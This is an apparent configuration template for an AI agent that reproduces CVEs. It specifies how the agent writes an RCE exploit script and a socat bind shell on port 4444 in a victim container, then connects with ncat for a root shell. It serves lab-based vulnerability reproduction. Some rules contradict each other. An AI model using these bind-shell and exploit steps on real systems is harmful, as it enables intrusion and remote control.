@@ -1,0 +1,297 @@
+# CVE 复现 — 远程代码执行（应用层屏障）
+target_type: remote_code_execution
+label: "远程代码执行"
+attack_surface: remote
+
+# 容器运行时配置（框架读取，不依赖 agent）
+container:
+  entrypoint_mode: "cmd"
+  requires_startup: true
+
+# verify.sh 自启动配置
+startup:
+  port: 8080
+  health: "/"
+  cmd: ""
+
+type_instruction: |
+  【远程代码执行模式】用户选择 RCE 目标。使用双容器架构：
+  攻击者容器（exppilot-attacker）→ 受害者容器（CVE 环境）。
+  验收标准：从攻击者容器 exec ncat 连入受害者容器，获得交互式 root shell。
+  
+  🔴 此 CVE 类型涉及 Web/网络服务，使用 docker_setup 时请传 entrypoint_mode="cmd"（保留 Dockerfile CMD 自动启动服务），
+  并视需要传 port_mappings 暴露端口（如 port_mappings=["3001:3001"]）。
+
+acceptance: |
+  ## RCE 漏洞验收标准
+
+  RCE 漏洞复现必须达到：**从攻击者容器跨网络连入受害者容器，获得交互式 shell**。
+
+  ### 必要条件（全部满足才算 RCE 成功）
+
+  1. ✅ 漏洞原语证明：exp.sh 通过漏洞机制创建 canary 文件 `/tmp/.pwned_<CVE-ID>`（如通过 system() / 命令注入 / exec 执行 `touch /tmp/.pwned_<CVE-ID>`）
+  2. ✅ 漏洞机制启动 bind shell：bind shell 必须由漏洞服务的命令执行原语启动（如发送 `shell bash /tmp/deploy_bind.sh` 让目标服务启动 socat），**不是 exp.sh 直接 nohup 启动**
+  3. ✅ bind shell 就绪：从攻击者容器 ncat 连入受害者 4444 端口获得 rootshell
+
+  ### 反面教材（以下不算真 RCE）
+
+  - ❌ exp.sh 直接写 `nohup socat TCP-LISTEN:4444 ...` — 这是 bash 自己起的，跟漏洞没关系
+  - ❌ 只在 if/else 失败分支里兜底启动 socat — 框架检测到会判为假阳性
+  - ❌ 漏洞触发只看了"CONV OK"没检查实际效果 — 不知道漏洞到底生效没
+
+  **双容器步骤：**
+  1. 受害者容器：docker_setup(..., network="exppilot-net")，搭建受影响版本的目标服务
+  2. 受害者容器：确保已安装 socat（apt-get install -y socat）
+  3. 攻击者容器：编写 verify.sh，exec ncat $VICTIM 4444 连入受害者
+  4. 用户运行 verify.sh → 直接落入受害者 root shell
+
+exp_sh:
+  header: |
+    ### 1. exp.sh — 漏洞利用（在受害者容器内运行）
+    搭建目标服务、触发漏洞、部署 bind shell。运行方式：`docker exec <受害者> bash /tmp/exp.sh`
+  sections:
+    - title: "通用规则"
+      rules:
+        - "🔴 exp.sh 必须是 bash 脚本（#!/bin/bash），禁止用 Python 或其他语言"
+        - "不使用 set -e，清理命令加 2>/dev/null || true"
+        - "🔴 exp.sh 自包含：① 触发漏洞 ② 通过漏洞机制创建 canary 文件证明原语成功 ③ 创建 /tmp/deploy_bind.sh ④ 通过漏洞机制启动 bind shell"
+        - "启动服务后用 sleep+curl 验证就绪，超时用 timeout 防止卡死"
+        - "包含触发漏洞的恶意请求/命令"
+        - "🔴 触发漏洞后立即创建 canary（通过漏洞执行 touch /tmp/.pwned_<CVE-ID>），再通过漏洞机制启动 bind shell"
+        - "🔴 禁止在 exp.sh 的任何位置包含 socat / ncat / 'nc -l' 监听命令——无论直接写还是藏在 exploit payload 字符串内（PHAR / system() / 命令注入 / os.system() 等）。"
+        - "末尾: 创建 /tmp/deploy_bind.sh → 通过漏洞机制启动 bind shell（发送 shell/bash 命令让漏洞服务启动 socat）→ sleep 1 → 输出 deploy_bind.sh 已就绪"
+    - title: "RCE 专用 — bind shell 部署"
+      rules:
+        - "🔴 bind shell 必须由漏洞机制启动，禁止 exp.sh 直接 nohup 启动 socat。正确做法：通过漏洞的 RCE 原语（命令注入 / uos.system() / exec / system() 等）让被攻击服务执行 bash /tmp/deploy_bind.sh"
+        - "🔴 socat 替代 ncat+pty_shell — socat 的 pty 选项直接创建伪终端，无需 /tmp/pty_shell 包装脚本。socat 的 fork 机制可靠处理多连接，无僵尸进程问题"
+        - "受害者容器必须安装 socat: apt-get install -y socat（Agent 在环境搭建阶段执行）"
+        - "创建 /tmp/deploy_bind.sh: echo -e '#!/bin/bash\\nfuser -k 4444/tcp 2>/dev/null || true\\nsleep 1\\nsocat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash -i,pty,stderr &' > /tmp/deploy_bind.sh && chmod +x /tmp/deploy_bind.sh"
+        - "🔴 不再创建 /tmp/pty_shell — socat 的 pty 选项已提供伪终端"
+        - "🔴 通过漏洞机制启动 bind shell（通过漏洞触发让目标服务执行 bash /tmp/deploy_bind.sh），然后验证端口 4444 已监听"
+        - "exp.sh 末尾输出: deploy_bind.sh 已就绪"
+
+verify_sh:
+  header: |
+    ### 2. verify.sh — 一键验证脚本（在攻击者容器内运行）
+    从 exppilot-attacker 容器跨网络连入受害者。运行方式：`docker exec -i exppilot-attacker bash /tmp/<CVE-ID>/verify.sh`
+  sections:
+    - title: "开头 — 确认受害者可达"
+      text: |
+        先确认受害者容器在网络中可访问：
+      code: |
+        VICTIM=<受害者容器名>
+        echo "============================================"
+        echo "  CVE-XXXX-XXXXX 远程代码执行验证"
+        echo "============================================"
+        echo ""
+        echo "[检查] 目标受害者: $VICTIM"
+        if ! ncat -z -w2 $VICTIM 4444 2>/dev/null; then
+            echo "❌ 无法连接受害者 $VICTIM (端口 4444 未开放)"
+            exit 1
+        fi
+        echo "✅ 受害者 $VICTIM 端口 4444 已开放"
+    - title: "中间 — 触发漏洞"
+      text: "运行 exp.sh 触发漏洞: bash /tmp/exp.sh（exp.sh 已在受害者上部署 bind shell）"
+    - title: "结尾 — 进入远程交互式 shell"
+      text: |
+        通过 ncat 连接受害者 bind shell，用户直接落入远程 root shell：
+      code: |
+        echo ""
+        echo "远程代码执行成功！进入受害者 shell..."
+        exec ncat $VICTIM 4444
+  skeleton: |
+    #!/bin/sh
+
+    # VICTIM 变量由 Agent 在编辑时填入受害者容器名
+    # 示例: VICTIM="exppilot-cve-xxxx-docker"
+    VICTIM="__VICTIM_CONTAINER__"
+
+    # [COMPLIANCE CHECK: precondition]
+    echo "━━━ [前置检查] 受害者服务可用性 ━━━"
+
+    # 从攻击者容器检查受害者服务是否可达
+    if ! ncat -z -w2 ${VICTIM} __PORT__ 2>/dev/null; then
+        echo "  ⚠️ 受害者 ${VICTIM} 服务未就绪，尝试在受害者上启动..."
+        if [ "__START_CMD__" != "__START_CMD__" ]; then
+            docker exec ${VICTIM} sh -c "nohup sh -c '__START_CMD__' > /tmp/server.log 2>&1 &"
+            sleep 5
+        fi
+    fi
+
+    for i in $(seq 1 15); do
+        if ncat -z -w2 ${VICTIM} __PORT__ 2>/dev/null; then
+            echo "  ✅ 受害者服务就绪"
+            break
+        fi
+        sleep 2
+        [ "$i" -eq 15 ] && echo "  ❌ 受害者服务不可达" && exit 1
+    done
+    echo ""
+
+    # [COMPLIANCE CHECK: exploitchain] — 验证漏洞原语证据
+    echo "━━━ [原语验证] 漏洞机制证据 ━━━"
+    CANARY="/tmp/.pwned_${VICTIM}"
+    if ncat -z -w2 ${VICTIM} __PORT__ 2>/dev/null; then
+        # 通过受害者服务检查 canary（前提是服务支持执行命令并返回结果）
+        CANARY_CHECK=$(echo "exec import os;print(os.path.exists('${CANARY}'))" | timeout 5 ncat ${VICTIM} __PORT__ 2>/dev/null || echo "NO")
+        if echo "$CANARY_CHECK" | grep -qi "True"; then
+            echo "  ✅ Canary 文件存在 — 漏洞原语确认"
+        else
+            echo "  ⚠️  Canary 未确认（服务不支持远程检查，将在 victim 内本地验证）"
+            # 用 verify.sh 自身去受害者容器检查（如果 docker exec 可用）
+            docker exec ${VICTIM} sh -c "test -f '${CANARY}'" 2>/dev/null && echo "  ✅ Canary 文件存在 — 漏洞原语确认" || echo "  ⚠️  Canary 检查跳过（非阻断）"
+        fi
+    fi
+    echo ""
+
+    # [COMPLIANCE CHECK: evidence_check]
+    if ncat -z -w2 ${VICTIM} 4444 2>/dev/null; then
+        echo "✅ bind shell 就绪 — ${VICTIM}:4444 已开放"
+    else
+        echo "❌ bind shell 未就绪 — 先在受害者上运行: docker exec ${VICTIM} bash /tmp/exp.sh"
+        exit 1
+    fi
+    echo ""
+    echo "远程代码执行成功！进入受害者 shell..."
+    echo ""
+
+    # [COMPLIANCE CHECK: end_marker]
+    exec ncat ${VICTIM} 4444
+
+  end_marker: "exec ncat $VICTIM 4444"
+
+readme_chapters:
+  - name: "快速验证"
+    desc: |
+      🔴 RCE 双容器验证必须分两步写:
+      1. 受害容器: `docker exec <受害者容器> bash /tmp/exp.sh`
+         （触发漏洞+部署 bind shell）
+      2. 攻击者容器: `docker exec -i exppilot-attacker bash /tmp/<CVE-ID>/verify.sh`
+         （连入远程 shell）
+      带两步各自的预期输出。"
+
+files:
+  - name: exp.sh
+    desc: "漏洞利用（在受害者容器内运行，创建 deploy_bind.sh）"
+    category: exploit
+    end_marker: "deploy_bind.sh 已就绪"
+    rules:
+      - "🔴 exp.sh 必须是 bash 脚本（#!/bin/bash），禁止用 Python"
+      - "在受害者容器内运行：docker exec <受害者> bash /tmp/exp.sh"
+      - "不使用 set -e"
+      - "只包含漏洞触发（恶意请求/PoC 执行），不包含服务启动"
+      - "末尾: 创建 /tmp/deploy_bind.sh → nohup bash /tmp/deploy_bind.sh > /dev/null 2>&1 & → sleep 1 → netstat 确认"
+      - "🔴 exp.sh 末尾自动启动 bind shell，Agent 无需额外调用 docker_run"
+      - "末尾输出 deploy_bind.sh 已就绪"
+
+  - name: verify.sh
+    desc: "验证脚本（在攻击者容器内运行）"
+    category: verify
+    end_marker: "exec ncat $VICTIM 4444"
+    rules:
+      - "先 write_file 将 verify.sh 写入 output 目录（自动落盘）"
+      - "再 docker cp 到攻击者容器（按 CVE 分目录，避免覆盖）：docker cp <output>/verify.sh exppilot-attacker:/tmp/<CVE-ID>/verify.sh"
+      - "从攻击者容器运行：docker exec -i exppilot-attacker bash /tmp/<CVE-ID>/verify.sh"
+      - "开头定义 VICTIM=<受害者容器名>，ping 确认可达"
+      - "运行 verify.sh 前，先在受害者上运行 bash /tmp/exp.sh 触发漏洞（exp.sh 末尾会自动启动 bind shell）"
+      - "exp.sh 完成后用 docker_run(command='netstat -tlnp | grep 4444') 确认 bind shell 已监听"
+      - "最后 exec ncat $VICTIM 4444 进入远程 shell"
+      - "禁止在 exec ncat 后追加任何行（exit/echo/空行）"
+
+inject_on_write:
+  verify.sh:
+    pre_check: |
+      🔴 你即将写入 verify.sh。目标类型: remote_code_execution。写入前必须确认：
+
+      1. 此脚本在**攻击者容器**（exppilot-attacker）内运行，不是受害者容器
+      2. 开头定义 VICTIM=<受害者容器名>
+      3. 开头 ping -c 1 -W 2 $VICTIM 确认受害者可达
+      4. 最后一行严格等于 exec ncat $VICTIM 4444
+      5. 禁止在 exec ncat 后追加任何行（exit/echo/空行）
+      6. 不使用 set -e
+
+    post_check: |
+      🔴 verify.sh 写入完成。现在立即 read_file 读回该文件，逐条自检：
+
+      1. 是否定义了 VICTIM 变量？□
+         → 如果没有 → 用 write_file 重写
+      2. 是否有 ping 检查受害者可达？□
+         → 如果没有 → 用 write_file 重写
+      3. 最后一行是否严格等于 exec ncat $VICTIM 4444？□
+         → 如果后面有额外 exit/echo/空行 → 删除，用 write_file 重写
+         → 如果是 exec nc 而非 exec ncat → 改为 ncat，nc 不兼容 pty
+      4. 是否有 set -e？□
+         → 如果有 → 删除，用 write_file 重写
+      5. verify.sh 正文中是否包含 docker exec（攻击者容器内 docker 命令不可用）？□
+         → 如果有 → 删除该行。exp.sh 由用户在受害者容器上手动运行，verify.sh 只管用 ncat 连接 bind shell
+
+      🔴 任一 □ 打叉 → 立即重写。全部通过后才能继续下一步。
+
+      7. `bash -n` 语法检查是否通过？□
+         → 如果不通过 → 修正语法错误，用 write_file 重写
+
+  exp.sh:
+    pre_check: |
+      🔴 你即将写入 exp.sh。目标类型: remote_code_execution。写入前必须确认：
+
+      1. 第一行是 #!/bin/bash（绝对禁止用 Python 或其他语言）
+      2. 🔴 exp.sh 做四件事：① 触发漏洞 ② 通过漏洞机制创建 canary（touch /tmp/.pwned_<CVE-ID>）③ 创建 /tmp/deploy_bind.sh ④ 通过漏洞机制启动 bind shell
+      3. 🔴 socat/ncat/nc -l 只能出现在 /tmp/deploy_bind.sh 中，禁止出现在 exp.sh 正文（包括 exploit payload 字符串内）
+      4. 🔴 禁止在 exp.sh 中包含服务启动命令（php artisan serve / php -S / python -m http.server）
+      5. 🔴 bind shell 必须由漏洞机制启动（如通过命令注入/exec/system()让服务执行 bash /tmp/deploy_bind.sh）。禁止 exp.sh 直接 nohup 启动 socat
+      6. 不使用 set -e
+      7. 末尾通过漏洞机制启动 bind shell → sleep 1 → 输出 deploy_bind.sh 已就绪
+
+    post_check: |
+      🔴 exp.sh 写入完成。现在立即 read_file 读回该文件，逐条自检：
+
+      1. 第一行是否是 #!/bin/bash？□
+         → 如果不是 → 用 write_file 重写
+      2. exp.sh 正文中是否包含 socat/ncat/nc -l？（用 grep 扫描全文，含 payload 字符串）□
+         → 如果有 → 删除或替换为无害命令（如 touch /tmp/.pwned_<CVE-ID>），用 write_file 重写
+      3. 是否在触发漏洞前启动了目标服务并验证就绪？□
+         → 如果没有 → 加上启动+等待逻辑，用 write_file 重写
+      4. 🔴 是否通过漏洞机制创建了 canary（touch /tmp/.pwned_<CVE-ID> 且 touch 命令由漏洞服务执行而非 bash）？□
+         → 如果 canary 由 bash 直接 touch（非漏洞服务执行）→ 这不是漏洞原语证据，改为通过 exploit payload 执行 touch，用 write_file 重写
+      5. 是否创建了 /tmp/deploy_bind.sh 并 chmod +x？□
+         → 如果没有 → 用 write_file 重写
+      6. deploy_bind.sh 的 socat 是否包含 ,pty,stderr？（echo -e 内容中 grep pty）□
+         → 如果没有（仅裸 EXEC:/bin/bash）→ 在 socat 命令末尾加上 ,pty,stderr，用 write_file 重写
+         → 附: 带 pty,stderr 的正确写法: socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash -i,pty,stderr
+      7. 🔴 bind shell 是否由漏洞机制启动（通过 exploit payload 发送命令让服务执行 bash /tmp/deploy_bind.sh）？□
+         → 如果是 exp.sh 直接 nohup bash /tmp/deploy_bind.sh & → 改为通过漏洞机制启动。正确写法：通过命令注入/exec/system() 发送 "bash /tmp/deploy_bind.sh" 让漏洞服务执行，用 write_file 重写
+      8. 最后输出是否是 deploy_bind.sh 已就绪？□
+         → 如果不是或为裸文本 → 改为 echo "deploy_bind.sh 已就绪"，用 write_file 重写
+      9. 是否有 set -e？□
+         → 如果有 → 删除，用 write_file 重写
+
+      🔴 任一 □ 打叉 → 立即重写。全部通过后才能继续下一步。
+
+      7. `bash -n` 语法检查是否通过？□
+         → 如果不通过 → 修正语法错误，用 write_file 重写
+
+      10. exp.sh 开头是否清理了 CVE_WORKDIR 工作空间？□
+         → 如果没有 → 在开头加 rm -rf "$CVE_WORKDIR" && mkdir -p "$CVE_WORKDIR"，用 write_file 重写
+      11. 如果 exp.sh 包含编译命令（go build/gcc/mvn），是否用 background=True 启动而非 timeout 等待？□
+         → 如果是同步编译 → 改为 background=True 启动 + 轮询检查二进制
+checks:
+  - name: "exp.sh 第一行是 #!/bin/bash（不是 #!/usr/bin/env python3）"
+    on_fail: "将 exp.sh 改为 bash 脚本，以 #!/bin/bash 开头。exp.sh 运行在容器内必须用 bash，不能用 Python"
+  - name: "exp.sh 中出现 socat / ncat 或 'nc -l' 命令（用 grep 扫描内容，含 payload 字符串）→ 必须删除"
+    on_fail: "删除 exp.sh 中所有 socat/ncat/nc -l 命令。如果隐藏在 exploit payload 中，把它替换为 touch /tmp/.pwned_<CVE-ID>。socat 只能通过 /tmp/deploy_bind.sh 由漏洞机制启动。修复后重新 grep 确认无残留"
+  - name: "exp.sh 中出现服务启动命令（php artisan serve / php -S / python -m http.server）→ 必须删除"
+    on_fail: "删除 exp.sh 中的服务启动命令。服务由 Agent 在 exp.sh 之前单独用 docker_run(background=true) 启动，不在 exp.sh 内启动"
+  - name: "exp.sh 末尾创建 /tmp/deploy_bind.sh 并 chmod +x"
+    on_fail: "在 exp.sh 末尾加入 deploy_bind.sh 的创建命令（socat 单行启动脚本）"
+  - name: "exp.sh 末尾输出 deploy_bind.sh 已就绪"
+    on_fail: "确保 exp.sh 末尾输出 deploy_bind.sh 已就绪"
+  - name: "🔴 exp.sh 通过漏洞机制创建 canary（touch /tmp/.pwned_<CVE-ID>）"
+    on_fail: "exp.sh 必须通过漏洞服务的命令执行原语（system()/命令注入/exec）创建 canary 文件 /tmp/.pwned_<CVE-ID>。如果 canary 由 bash 直接 touch 而非漏洞服务执行，不算漏洞原语证明。加一行 exploit payload 执行 touch 命令"
+  - name: "🔴 bind shell 由漏洞机制启动，非 exp.sh 直接 nohup"
+    on_fail: "bind shell 必须由漏洞服务的命令执行原语启动（如发送 shell/bash 命令让目标服务执行 bash /tmp/deploy_bind.sh），禁止 exp.sh 直接 nohup bash /tmp/deploy_bind.sh &。通过漏洞机制启动后，框架会自动验证 socat 进程来源"
+  - name: "verify.sh 从攻击者容器运行，VICTIM 变量正确定义为受害者容器名"
+    on_fail: "确保 verify.sh 开头定义 VICTIM 变量，值为受害者容器名"
+  - name: "verify.sh 开头 ping 检查受害者可达"
+    on_fail: "在 verify.sh 开头加入 ping -c 1 $VICTIM 检查和 ✅/❌ 输出"
+  - name: "verify.sh 最后一行是 exec ncat $VICTIM 4444（必须用 ncat，不能是 nc）"
+    on_fail: "如果最后一行是 exec nc，改为 exec ncat。OpenBSD nc 与 pty.spawn 不兼容会导致 shell 无响应。确保 exec ncat 是最后一行"
